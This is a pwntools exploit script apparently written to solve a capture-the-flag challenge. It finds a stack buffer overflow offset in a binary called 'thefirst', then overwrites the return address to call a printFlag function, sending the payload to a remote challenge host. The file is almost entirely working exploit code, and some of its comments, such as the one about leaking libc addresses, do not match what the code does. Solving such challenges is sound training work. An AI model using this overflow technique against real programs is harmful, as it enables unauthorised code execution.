from pwn import *
from struct import pack

##########################################################################
# My approach to Binary Exploitation on ASLR Enabled systems.
# DOWNLOAD PWNTOOLS TO RUN!
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

nops = b'\x90'
padding = b'\x00'

clean = lambda x: x.split('\n')[1:-2]
pad = lambda x: x + padding*(8-len(x))

##########################################################################
# Load Binaries and Respective libc
#
# To Find the Libc version, make ROP chain to print address of libc
# functions, which are stored in GOT table as values of pointers.
# Just pass the address of pointer to RDI through pop rdi; ret
# And call puts function.
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

elf = ELF('./thefirst')
context.binary = './thefirst'
libc = ELF("/lib/x86_64-linux-gnu/libc-2.30.so")
# libc  = ELF("/lib/x86_64-linux-gnu/libc-2.30.so")
##########################################################################
# Find Offset
##########################################################################

r = elf.process()
crash = cyclic(1024)
r.recvline()
r.clean()
r.sendline(crash)
r.wait()
core = r.corefile
esp = core.esp
offset = core.read(esp, 4)
offset =  cyclic_find(offset)
success("Offset found @ {a} bytes".format(a=offset))

##########################################################################
# Generate Initial Payload to Leak memory
##########################################################################

### Find manually
crashOffset = offset	

### 0xffffcf4c is just some random value in stack space, just so EBP is valid
junk = nops*(crashOffset - 4)# + p32(0xffffcf4c) # Override EBP

padding = p32(0xdeadbeef)

### elf.symbols contains addresses of functions (and stubs as here)
printfret = p32(elf.symbols['printf'])
getsret = p32(elf.symbols['gets'])
mainret = p32(elf.symbols['main'])

printFlag = p32(elf.symbols['printFlag'])

##########################################################################
# Demo ==> 
##########################################################################


### This Payload prints puts and gets addressed and calls main function again
payload = b''.join([junk, \
    printFlag, \
    mainret])

# r = elf.process()
r = remote('chal.tuctf.com', 30508)
# gdb.attach(r.pid, """c""")

print(r.readline())
print(r.clean())

r.sendline(payload)
r.readline()    # This gives our flag!
